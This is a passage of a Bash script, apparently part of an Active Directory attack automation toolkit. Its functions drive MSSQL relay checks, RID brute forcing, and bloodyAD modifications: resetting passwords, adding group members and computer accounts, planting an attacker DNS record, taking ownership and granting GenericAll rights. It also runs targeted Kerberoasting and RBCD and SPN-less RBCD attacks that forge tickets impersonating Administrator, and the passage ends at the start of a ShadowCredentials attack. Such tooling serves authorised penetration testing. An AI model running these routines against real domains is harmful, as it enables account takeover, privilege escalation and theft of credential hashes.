            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
            if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
            run_command "${mssqlrelay} ${mssqlrelay_verbose} checkall ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dns_ip} -windows-auth" | tee "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" 2>&1
            sql_mssqlrelay="${MSSQL_dir}/mssql_relay_instances_${user_var}.txt"
            if [ -s "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" ]; then
                grep -i "MSSQLSvc" "${MSSQL_dir}/mssql_relay_checkall_output_${user_var}.txt" | awk -F'[/:)]+' '$3 ~ /^[0-9]+$/ {print $2 " -mssql-port " $3}' | sort -u >> "${sql_mssqlrelay}"
            fi
            if stat "${sql_mssqlrelay}" >/dev/null 2>&1; then
                for i in $(/bin/cat "${sql_mssqlrelay}"); do
                    echo "${mssqlrelay} ${mssqlrelay_verbose} check ${ldaps_param} ${dnstcp_param} ${argument_mssqlrelay} -ns ${dns_ip} -windows-auth -target $i" > "${MSSQL_dir}/mssql_relay_check_run_${user_var}.sh" 2>&1
                done
            fi
        fi
    fi
    echo -e ""
}

mssqlclient_console() {
    if ! stat "${impacket_mssqlclient}" >/dev/null 2>&1; then
        echo -e "${RED}[-] mssqlclient.py not found! Please verify the installation of impacket ${NC}"
    elif [ "${nullsess_bool}" == true ]; then
        echo -e "${PURPLE}[-] mssqlclient requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
        echo -e "${CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com ${NC}"
        read -rp ">> " mssqlclient_target </dev/tty
        while [ "${mssqlclient_target}" == "" ]; do
            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
            read -rp ">> " mssqlclient_target </dev/tty
        done
        echo -e "${BLUE}[*] Opening mssqlclient.py console on target: $mssqlclient_target ${NC}"
        run_command "${impacket_mssqlclient} ${argument_imp}\\@${mssqlclient_target} -windows-auth" 2>&1 | tee -a "${MSSQL_dir}/impacket_mssqlclient_output_${user_var}.txt"
    fi
    echo -e ""
}

mssqlpwner_console() {
    if ! stat "${mssqlpwner}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of mssqlpwner${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] mssqlpwner requires credentials${NC}"
        else
            current_dir=$(pwd)
            cd "${MSSQL_dir}" || exit
            echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
            echo -e "${CYAN}[*] Example: 10.1.0.5 or SQL01 or SQL01.domain.com ${NC}"
            read -rp ">> " mssqlpwner_target </dev/tty
            while [ "${mssqlpwner_target}" == "" ]; do
                echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
                read -rp ">> " mssqlpwner_target </dev/tty
            done
            echo -e "${BLUE}[*] Opening mssqlpwner console${NC}"
            run_command "${mssqlpwner} ${argument_mssqlpwner}@${mssqlpwner_target} -dc-ip ${dc_ip} -windows-auth interactive" | tee -a "${MSSQL_dir}/mssqlpwner_output_${user_var}.txt" 2>&1
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

mssql_ridbrute_attack() {
    if [ "${nullsess_bool}" == true ]; then
        echo -e "${BLUE}[*] MSSQL RID Brute Force (Null session)${NC}"
        run_command "${netexec} ${ne_verbose} mssql ${target} ${argument_ne} --rid-brute --log ${BruteForce_dir}/ne_mssql_brute_${dc_domain}.txt"
        run_command "${netexec} ${ne_verbose} mssql ${target} -u Guest -p '' --rid-brute --log ${BruteForce_dir}/ne_mssql_brute_${dc_domain}.txt"
        run_command "${netexec} ${ne_verbose} mssql ${target} -u ${rand_user} -p '' --rid-brute --log ${BruteForce_dir}/ne_mssql_brute_${dc_domain}.txt"
        #Parsing user lists
        grep "SidTypeUser" "${BruteForce_dir}/ne_mssql_rid_brute_${dc_domain}.txt" 2>/dev/null | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" > "${Users_dir}/users_list_mssql_ridbrute_${dc_domain}.txt" 2>&1
        parse_users
    else
        echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
    fi
    echo -e ""
}

mssql_enum_domain_users() {
    echo -e "${BLUE}[*] MSSQL RID Brute Force (Null session)${NC}"
    run_command "${netexec} ${ne_verbose} mssql ${target} ${argument_ne} --rid-brute --log ${BruteForce_dir}/ne_mssql_brute_${dc_domain}.txt"
    #Parsing user lists
    grep "SidTypeUser" "${BruteForce_dir}/ne_mssql_rid_brute_${dc_domain}.txt" 2>/dev/null | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" > "${Users_dir}/users_list_mssql_ridbrute_${dc_domain}.txt" 2>&1
    parse_users
    echo -e ""
}

###### Modification of AD Objects or Attributes
change_pass() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Changing passwords of a user or computer account. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
            target_passchange=""
            read -rp ">> " target_passchange </dev/tty
            while [ "${target_passchange}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_passchange </dev/tty
            done
            echo -e "${BLUE}[*] Please specify new password (default: Summer3000_):${NC}"
            pass_passchange=""
            read -rp ">> " pass_passchange </dev/tty
            if [[ ${pass_passchange} == "" ]]; then pass_passchange="Summer3000_"; fi
            echo -e "${CYAN}[*] Changing password of ${target_passchange} to ${pass_passchange}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set password ${target_passchange} ${pass_passchange}" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_passchange_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_group_member() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding user to group. Please specify target group:${NC}"
            echo -e "${CYAN}[*] Example: group01 ${NC}"
            target_groupmem=""
            read -rp ">> " target_groupmem </dev/tty
            while [ "${target_groupmem}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target group:"
                read -rp ">> " target_groupmem </dev/tty
            done
            echo -e "${BLUE}[*] Please specify user to add to the group (default: current user):${NC}"
            user_groupmem=""
            read -rp ">> " user_groupmem </dev/tty
            if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
            echo -e "${CYAN}[*] Adding ${user_groupmem} to group ${target_groupmem}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_groupmem_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

remove_group_member() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Removing user from group. Please specify target group:${NC}"
            echo -e "${CYAN}[*] Example: group01 ${NC}"
            target_groupmem=""
            read -rp ">> " target_groupmem </dev/tty
            while [ "${target_groupmem}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target group:"
                read -rp ">> " target_groupmem </dev/tty
            done
            echo -e "${BLUE}[*] Please specify user to remove from the group (default: current user):${NC}"
            user_groupmem=""
            read -rp ">> " user_groupmem </dev/tty
            if [ "${user_groupmem}" == "" ]; then user_groupmem="${user}"; fi
            echo -e "${CYAN}[*] Removing ${user_groupmem} from group ${target_groupmem}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove groupMember '${target_groupmem}' '${user_groupmem}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_groupmem_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_computer() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding new computer account. Please specify computer hostname (default: WS3000):${NC}"
            read -rp ">> " host_addcomp </dev/tty
            if [[ ${host_addcomp} == "" ]]; then host_addcomp="WS3000"; fi
            echo -e "${BLUE}[*] Please specify new password (default: Summer3000_):${NC}"
            read -rp ">> " pass_addcomp </dev/tty
            if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
            echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_computer_ou() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding new computer account. Please specify computer hostname (default: WS3000):${NC}"
            read -rp ">> " host_addcomp </dev/tty
            if [[ ${host_addcomp} == "" ]]; then host_addcomp="WS3000"; fi
            echo -e "${BLUE}[*] Please specify new password (default: Summer3000_):${NC}"
            read -rp ">> " pass_addcomp </dev/tty
            if [[ ${pass_addcomp} == "" ]]; then pass_addcomp="Summer3000_"; fi
            echo -e "${BLUE}[*] Please specify name of writeable OU:${NC}"
            echo -e "${CYAN}[*] Example: OU=Computers,DC=domain,DC=local${NC}"
            read -rp ">> " ou_addcomp </dev/tty
            while [ "${ou_addcomp}" == "" ]; do
                echo -e "${RED}Invalid OU.${NC} Please specify name of OU:"
                read -rp ">> " ou_addcomp </dev/tty
            done
            echo -e "${CYAN}[*] Creating computer ${host_addcomp} with password ${pass_addcomp} to OU ${ou_addcomp}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add computer '${host_addcomp}' '${pass_addcomp}' --ou '${ou_addcomp}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_addcomp_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

dnsentry_add() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Please specify hostname of the attacker DNS entry (default: kali):${NC}"
            hostname_dnstool=""
            read -rp ">> " hostname_dnstool </dev/tty
            if [ "${hostname_dnstool}" == "" ]; then hostname_dnstool="kali"; fi
            echo -e "${BLUE}[*] Please confirm the IP of the attacker's machine:${NC}"
            set_attackerIP
            echo -e "${BLUE}[*] Adding new DNS entry for Active Directory integrated DNS${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} --dns ${dns_ip} add dnsRecord ${hostname_dnstool} ${attacker_IP}" | tee -a "${Modification_dir}//bloodyAD_${user_var}/bloodyad_dns_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

enable_account() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Please specify account to enable:${NC}"
            echo -e "${CYAN}[*] Example: svc_sql ${NC}"
            account_enable=""
            read -rp ">> " account_enable </dev/tty
            while [ "${account_enable}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target account:"
                read -rp ">> " account_enable </dev/tty
            done
            echo -e "${BLUE}[*] Enabling account ${account_enable}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 remove uac ${account_enable} -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_enable_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

disable_account() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Please specify account to disable:${NC}"
            echo -e "${CYAN}[*] Example: svc_sql ${NC}"
            account_disable=""
            read -rp ">> " account_disable </dev/tty
            while [ "${account_disable}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target account:"
                read -rp ">> " account_disable </dev/tty
            done
            echo -e "${BLUE}[*] Disabling account ${account_disable}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} -f rc4 add uac ${account_disable} -f ACCOUNTDISABLE" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_disable_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

restore_account() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Please specify account to restore:${NC}"
            echo -e "${CYAN}[*] Example: svc_sql ${NC}"
            account_restore=""
            read -rp ">> " account_restore </dev/tty
            while [ "${account_enable}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target account:"
                read -rp ">> " account_restore </dev/tty
            done
            echo -e "${BLUE}[*] Restoring account ${account_restore}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set restore ${account_restore}" | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_restore_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}


change_owner() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Changing owner of a user, computer, group, etc. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}"
            target_ownerchange=""
            read -rp ">> " target_ownerchange </dev/tty
            while [ "${target_ownerchange}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_ownerchange </dev/tty
            done
            echo -e "${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set owner ${target_ownerchange} '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_ownerchange_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

add_genericall() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Adding GenericAll rights of a user, computer, group, etc. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}"
            target_genericall=""
            read -rp ">> " target_genericall </dev/tty
            while [ "${target_genericall}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_genericall </dev/tty
            done
            echo -e "${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add genericAll ${target_genericall} '${user}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_genericall_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

delete_object() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Deleting object account. Please specify object to remove:${NC}"
            echo -e "${CYAN}[*] Example: user01 or DC01$ or group01 ${NC}"
            obj_delete=""
            read -rp ">> " obj_delete </dev/tty
            while [ "${obj_delete}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify object:"
                read -rp ">> " obj_delete </dev/tty
            done
            echo -e "${CYAN}[*] Deleting object ${obj_delete}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove object '${obj_delete}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_delobj_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

targetedkerberoast_attack() {
    if ! stat "${targetedKerberoast}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the location of targetedKerberoast.py${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] targetedKerberoast requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Targeted Kerberoasting Attack (Noisy!)${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            run_command "${python3} ${targetedKerberoast} ${argument_targkerb} -D ${dc_domain} --dc-ip ${dc_ip} ${ldaps_param} --only-abuse --dc-host ${dc_NETBIOS} -o ${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt" 2>&1 | tee "${Modification_dir}/targetedkerberoast_output_${user_var}.txt"
            if [ -s "${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt" ]; then
                hash_count=$(wc -l < "${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt")
                if [[ ! "${hash_count}" == 0 ]]; then
                    echo -e "${GREEN}[+] ${hash_count} hashes extracted! Saved to:${NC} ${Kerberos_dir}/targetedkerberoast_hashes_${dc_domain}.txt"
                else
                    echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                fi
            elif [ "${noexec_bool}" == "false" ]; then
                echo -e "${PURPLE}[-] No hashes found!${NC}"
            fi
        fi
    fi
    echo -e ""
}

rbcd_attack() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Performing RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: DC01 ${NC}"
            target_rbcd=""
            read -rp ">> " target_rbcd </dev/tty
            while [ "${target_rbcd}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_rbcd </dev/tty
            done
            echo -e "${BLUE}[*] Please specify account under your control:${NC}"
            echo -e "${CYAN}[*] Example: user01 or DC01$ ${NC}"
            service_rbcd=""
            read -rp ">> " service_rbcd </dev/tty
            while [ "${service_rbcd}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify account under your control:"
                read -rp ">> " service_rbcd </dev/tty
            done
            echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using account ${service_rbcd}${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${service_rbcd}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcd_${dc_domain}.txt"
            if grep -q "can now impersonate users" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcd_${dc_domain}.txt"; then
                echo -e "${GREEN}[+] RBCD Attack successful! Run option Kerberos/18 or the command below to generate ticket${NC}"
                echo -e "${impacket_getST} -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${service_rbcd}:<PASSWORD>'"
                echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
                echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${service_rbcd}'"
            fi
        fi
    fi
    echo -e ""
}

rbcd_spnless_attack() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Performing SPN-less RBCD attack: impersonate users on target via S4U2Proxy. Please specify target:${NC}"
            echo -e "${CYAN}[*] Example: DC01 ${NC}"
            target_rbcd=""
            read -rp ">> " target_rbcd </dev/tty
            while [ "${target_rbcd}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify target:"
                read -rp ">> " target_rbcd </dev/tty
            done
            echo -e "${BLUE}[*] Please specify SPN-less account under your control:${NC}"
            echo -e "${CYAN}[*] Example: user01 ${NC}"
            user_spnless=""
            read -rp ">> " user_spnless </dev/tty
            while [ "${user_spnless}" == "" ]; do
                echo -e "${RED}Invalid name.${NC} Please specify account under your control:"
                read -rp ">> " user_spnless </dev/tty
            done
            echo -e "${YELLOW}[!] Warning: This will modify the password of the SPN-less account under your control:${NC}"
            echo -e "${BLUE}[*] Please provide password or NT hash of SPN-less account under your control:${NC}"
            pass_spnless=""
            read -rp ">> " pass_spnless </dev/tty
            while [ "${pass_spnless}" == "" ]; do
                echo -e "${RED}Invalid password.${NC} Please specify password or NT hash of account under your control:"
                read -rp ">> " pass_spnless </dev/tty
            done
            echo -e "${CYAN}[*] Performing RBCD attack against ${target_rbcd} using SPN-less account ${user_spnless}${NC}"
            if ! stat "${impacket_getTGT}" >/dev/null 2>&1; then
                echo -e "${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}"
            else
                if [[ ${#pass_spnless} -eq 32 ]]; then
                    spnless_hash="${pass_spnless}"
                else
                    spnless_hash=$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$pass_spnless") | $(which openssl) dgst -md4 | cut -d " " -f 2)
                fi
                current_dir=$(pwd)
                cd "${Modification_dir}/" || exit
                echo -e "${CYAN}[*] Requesting TGT for user ${user_spnless}${NC}"
                run_command "${impacket_getTGT} ${domain}/${user_spnless} -hashes :${spnless_hash} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee -a "${Modification_dir}/impacket_spnless_changepasswd_${user_var}.txt"
                if stat "${Modification_dir}/${user_spnless}.ccache" >/dev/null 2>&1; then
                    krb_ticket="${Modification_dir}/${user_spnless}.ccache"
                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
                    run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add rbcd '${target_rbcd}$' '${user_spnless}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcdspnless_${dc_domain}.txt"
                    ticketsesskey=$(${impacket_describeticket} "${Modification_dir}/${user_spnless}.ccache" | grep 'Ticket Session Key' | cut -d " " -f 17)
                    run_command "${impacket_changepasswd} ${domain}/${user_spnless}\\@${dc_ip} -hashes :${spnless_hash} -newhashes :${ticketsesskey}" | tee -a "${Modification_dir}/impacket_spnless_changepasswd_${user_var}.txt"
                    if grep -q "can now impersonate users" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_rbcdspnless_${dc_domain}.txt"; then
                        echo -e "${GREEN}[+] SPN-less RBCD Attack successful! Attempting to generate ticket to impersonate Administrator${NC}"
                        run_command "KRB5CCNAME=${Modification_dir}/${user_spnless}.ccache ${impacket_getST} -u2u -spn 'cifs/${target_rbcd}.${domain}' -impersonate Administrator -dc-ip ${dc_ip} '${domain}/${user_spnless}' -k -no-pass"
                        if stat "${Modification_dir}/Administrator@cifs_${target_rbcd}.${domain}@${domain}.ccache" >/dev/null 2>&1; then
                            echo -e "${GREEN}[+] Ticket impersonating Administrator generated successfully!${NC}"
                        else
                            echo -e "${RED}[-] Generation of ticket impersonating Administrator failed!${NC}"
                        fi
                        echo -e "${CYAN}[!] Run command below to reset password of ${user_spnless}:${NC}"
                        echo -e "${impacket_changepasswd} ${domain}/${user_spnless}@${dc_ip} -hashes :${ticketsesskey} -newpass <NEW PASSWORD>"
                        echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
                        echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${user_spnless}'"
                    fi
                elif [ "${noexec_bool}" == "false" ]; then
                    echo -e "${RED}[-] Failed to generate TGT${NC}"
                fi
                cd "${current_dir}" || exit
            fi

        fi
    fi
    echo -e ""
}

shadowcreds_attack() {
    if ! stat "${bloodyad}" >/dev/null 2>&1; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] Performing ShadowCredentials attack: Create and assign Key Credentials to target. Please specify target:${NC}"
